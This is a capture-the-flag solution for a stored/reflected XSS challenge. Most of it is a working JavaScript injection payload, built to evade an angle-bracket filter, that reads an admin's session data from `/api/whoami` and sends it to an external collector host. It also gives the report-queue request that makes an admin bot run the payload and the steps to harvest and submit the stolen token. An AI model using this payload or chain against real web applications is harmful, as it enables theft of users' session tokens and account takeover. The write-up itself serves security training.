Full chain.

Payload (goes in `?promo`, URL-encoded; **no angle brackets** — and note it uses
`function(){}` expressions, not `=>` arrows, because `=>` contains a `>` that the
filter would strip):

```js
';fetch('/api/whoami',{credentials:'include'}).then(function(r){return r.text()}).then(function(t){new Image().src='http://collector:9000/report?w='+encodeURIComponent(t)});//
```

Submit the path that carries it to the report queue:

```
POST /report
Content-Type: application/json

{"url":"/?promo=%27%3Bfetch%28%27%2Fapi%2Fwhoami%27%2C%7Bcredentials%3A%27include%27%7D%29.then%28function%28r%29%7Breturn%20r.text%28%29%7D%29.then%28function%28t%29%7Bnew%20Image%28%29.src%3D%27http%3A%2F%2Fcollector%3A9000%2Freport%3Fw%3D%27%2BencodeURIComponent%28t%29%7D%29%3B%2F%2F"}
```

Wait ~2 seconds for the admin bot to visit the queued path. Then read what the
collector captured through the app's proxy:

```
GET /oob/received
```

You will see an item with a path like
`/report?w=%7B%22user%22%3A%22admin%22%2C%22token%22%3A%22<32 hex>%22%7D` — that
is the URL-encoded `{"user":"admin","token":"<32 hex>"}`. Pull out the 32-hex
token and submit it:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{...}`. (`/solve` accepts either the bare 32-hex token or a full
`session=<value>` string.)
